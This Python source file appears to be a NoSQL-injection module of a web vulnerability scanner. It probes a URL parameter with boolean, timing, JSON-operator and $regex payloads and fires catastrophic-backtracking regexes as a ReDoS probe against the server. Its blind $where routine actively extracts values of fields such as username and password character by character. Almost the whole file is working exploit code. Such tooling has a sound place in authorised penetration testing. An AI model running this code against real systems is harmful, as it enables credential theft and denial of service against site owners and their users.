import json as _json
import re
import time
from typing import Dict, Optional

import requests

from tools.http_client import build_url
from tools.log_utils import get_logger
from tools.payload_engine import generate
from tools.settings import settings
from tools.verification_oracle import ConfidenceVoter

logger = get_logger("nosqli_detector")

NOSQLI_ERROR_PATTERNS = [
    r"MongoError",
    r"MongoDB",
    r"Uncaught MongoDB",
    r"ArangoError",
    r"arangosh",
    r"Couchbase",
    r"Cassandra",
    r"RethinkDB",
    r"Firebase",
    r"Invalid BSON",
    r"ConditionalCheckFailed",
    r"Cosmos\s*DB",
    r"FaunaDB",
    r"N1QL",
    r"query\s*parser",
    r"ValidationError",
    r"CastError",
    r"BSONObj\s*size",
    r"E11000\s*duplicate",
]


_WHERE_FIELDS = ["username", "password", "name", "email", "role", "user", "admin"]

# Catastrophic-backtracking regexes: polynomial/exponential evaluation time
# on long strings - a reliable MongoDB $regex timing oracle.
_REDOS_PATTERNS = [
    "^(?=.*a)(?=.*b)(?=.*c)(?=.*d)(?=.*e)(?=.*f)(?=.*g)(?=.*h)(?=.*i)(?=.*j).*$",
    "^(a+)+$",
    "^([a-zA-Z]+)*$",
    "^(.*){25,}$",
]
_REDOS_BENIGN = "^.*$"


def _detect_redos(url: str, param: str, sess: requests.Session,
                  timeout: float, threshold: float = 2.0) -> Dict:
    """Time-based ReDoS detection via $regex catastrophic backtracking."""
    result = {"vulnerable": False, "type": "redos", "evidence": [],
              "delay": 0.0}
    def _time_regex(pattern: str) -> float:
        try:
            start_t = time.time()
            sess.post(url, json={param: {"$regex": pattern}},
                      timeout=timeout + 2)
            return time.time() - start_t
        except requests.Timeout:
            return timeout + 2.0
        except Exception:
            return 0.0

    benign_t = _time_regex(_REDOS_BENIGN)
    if benign_t >= timeout * 0.8:
        return result
    best = 0.0
    best_pattern = ""
    for pattern in _REDOS_PATTERNS:
        t = _time_regex(pattern)
        if t > best:
            best, best_pattern = t, pattern
    if best >= threshold and best >= benign_t * 2.5:
        result["vulnerable"] = True
        result["delay"] = round(best, 2)
        result["evidence"].append(
            "nosqli ReDoS: %s (%.1fs vs benign %.1fs)" % (
                best_pattern[:30], best, benign_t))
    return result


def _extract_where_blind(url: str, param: str, sess: requests.Session,
                         timeout: float, max_len: int = 16) -> list:
    """Boolean-blind extraction via a MongoDB $where JS oracle.

    POSTs {"<param>": {"$where": "<js condition>"}}; true/false conditions
    produce a response-length oracle, then binary-searches characters of
    common fields (this.<field>.charCodeAt(i) > N).
    """
    def _oracle(condition: str) -> bool:
        try:
            r = sess.post(url, json={param: {"$where": condition}},
                          timeout=timeout)
            return r.status_code == 200 and len(r.text) > 30
        except Exception:
            return False

    # Sanity: true vs false conditions must differ.
    try:
        rf = sess.post(url, json={param: {"$where": "false"}}, timeout=timeout)
        rt = sess.post(url, json={param: {"$where": "true"}}, timeout=timeout)
    except Exception:
        return []
    if rf is None or rt is None:
        return []
    if len(rt.text) <= len(rf.text) + 10:
        return []
    threshold = (len(rt.text) + len(rf.text)) // 2

    def _test_gt(condition: str) -> bool:
        try:
            r = sess.post(url, json={param: {"$where": condition}},
                          timeout=timeout)
            return r is not None and len(r.text) > threshold
        except Exception:
            return False

    data = []
    for field in _WHERE_FIELDS:
        extracted = ""
        for pos in range(max_len):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                cond = "this.%s.charCodeAt(%d)>%d" % (field, pos, mid)
                if _test_gt(cond):
                    low = mid + 1
                else:
                    high = mid - 1
            if not (32 <= low <= 126):
                break
            ch = chr(low)
            if ch == " " and extracted.endswith(" "):
                break
            extracted += ch
        extracted = extracted.rstrip()
        if len(extracted) >= 3:
            data.append({"source": "where_blind_%s" % field, "value": extracted})
    return data


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, waf_name: Optional[str] = None) -> dict:
    if sess is None:
        sess = requests.Session()
    sess.verify = settings.verify_ssl
    result = {"vulnerable": False, "type": None, "evidence": [], "payload": None}

    voter = ConfidenceVoter()

    try:
        r_base = sess.get(build_url(url, param, "1"),
                          timeout=timeout)
        base_len = len(r_base.text)
        base_status = r_base.status_code
    except Exception as e:
        logger.debug("nosqli baseline: %s", e)
        base_len = 0
        base_status = 0

    bool_hits = 0
    seeds = generate("nosqli", "boolean", "string", waf_name)
    for entry in seeds:
        payload = entry["payload"]
        try:
            r = sess.get(build_url(url, param, payload),
                         timeout=timeout)
            diff = abs(len(r.text) - base_len)
            if diff > 30 or r.status_code != base_status:
                bool_hits += 1
                result["evidence"].append("nosqli: %s (%d diff)" % (payload[:25], diff))
                result["payload"] = payload
                voter.add_vote("bool_diff", ConfidenceVoter.vote_length_diff(len(r.text), base_len))
            for pat in NOSQLI_ERROR_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["evidence"].append("nosqli error: %s" % pat[:25])
                    result["payload"] = payload
                    voter.add_vote("error_%s" % pat[:20], 0.6)
                    bool_hits += 1
                    break
        except Exception as e:
            logger.debug("nosqli payload %s: %s", payload[:20], e)

    if bool_hits >= 2:
        voter.add_vote("multi_bool", 0.8)
        result["vulnerable"] = True
        result["type"] = "boolean"
    elif bool_hits == 1:
        voter.add_vote("single_bool", 0.5)
        result["vulnerable"] = True
        result["type"] = "boolean"

    if not result["vulnerable"]:
        time_hits = 0
        time_seeds = generate("nosqli", "where_time", "string", waf_name)
        for entry in time_seeds:
            payload = entry["payload"]
            threshold = entry.get("threshold", 2.5)
            try:
                start_t = time.time()
                r = sess.get(build_url(url, param, payload),
                             timeout=timeout + 2)
                elapsed = time.time() - start_t
                if elapsed >= threshold:
                    time_hits += 1
                    result["evidence"].append("nosqli time: %s (%.1fs)" % (payload[:25], elapsed))
                    result["payload"] = payload
                    voter.add_vote("time_delay", 0.6)
            except Exception as e:
                logger.debug("nosqli time %s: %s", payload[:20], e)
        if time_hits >= 2:
            voter.add_vote("multi_time", 0.8)
            result["vulnerable"] = True
            result["type"] = "time"
        elif time_hits == 1:
            voter.add_vote("single_time", 0.5)
            result["vulnerable"] = True
            result["type"] = "time"

    if not result["vulnerable"]:
        json_hits = 0
        json_seeds = generate("nosqli", "json", "json", waf_name)
        for entry in json_seeds:
            payload_raw = entry["payload"]
            try:
                r = sess.post(url, json={param: _json.loads(payload_raw)},
                              timeout=timeout)
                if r.status_code == 200 and len(r.text) > base_len + 10:
                    json_hits += 1
                    result["evidence"].append("nosqli json: %s" % payload_raw[:25])
                    result["payload"] = payload_raw
                    voter.add_vote("json_diff", 0.5)
            except Exception as e:
                logger.debug("nosqli json: %s", e)
        if json_hits >= 1:
            result["vulnerable"] = True
            result["type"] = "json"

    if not result["vulnerable"]:
        regex_hits = 0
        regex_seeds = generate("nosqli", "regex", "string", waf_name)
        for entry in regex_seeds:
            payload = entry["payload"]
            try:
                r = sess.get(build_url(url, param, payload), timeout=timeout)
                diff = abs(len(r.text) - base_len)
                if diff > 20 or r.status_code != base_status:
                    regex_hits += 1
                    result["evidence"].append("nosqli $regex: %s (%d diff)" % (payload[:25], diff))
                    result["payload"] = payload
                    voter.add_vote("regex_diff", 0.5)
            except Exception as e:
                logger.debug("nosqli regex %s: %s", payload[:20], e)
        if regex_hits >= 2:
            voter.add_vote("multi_regex", 0.75)
            result["vulnerable"] = True
            result["type"] = "regex"
        elif regex_hits == 1:
            voter.add_vote("single_regex", 0.45)
            result["vulnerable"] = True
            result["type"] = "regex"

    # ReDoS timing oracle via $regex catastrophic backtracking.
    if not result["vulnerable"]:
        try:
            redos = _detect_redos(url, param, sess, timeout)
            if redos["vulnerable"]:
                result["vulnerable"] = True
                result["type"] = "redos"
                result["evidence"].extend(redos["evidence"])
                result["payload"] = "redos_regex"
                voter.add_vote("redos_time", 0.6)
        except Exception as e:
            logger.debug("nosqli redos: %s", e)

    # $where boolean-blind data extraction (best effort, POST JSON oracle).
    # Runs when the target already looks injectable OR reacted to JSON operator
    # probes (json_hits) - a $where-only target may show no generic diff.
    if result["vulnerable"] or json_hits >= 1:
        try:
            where_data = _extract_where_blind(url, param, sess, timeout)
            if where_data:
                result["where_extracted"] = where_data
                result["vulnerable"] = True
                if not result["type"]:
                    result["type"] = "where_blind"
                result["evidence"].append(
                    "nosqli $where blind: %s" % "; ".join(
                        "%s=%s" % (d["source"].replace("where_blind_", ""), d["value"])
                        for d in where_data[:4]))
                voter.add_vote("where_blind_extract", 0.7)
        except Exception as e:
            logger.debug("nosqli where blind: %s", e)

    result["confidence_score"] = round(voter.score, 2)
    result["confidence"] = voter.level.value
    result["confidence_votes"] = voter.evidence()
    return result
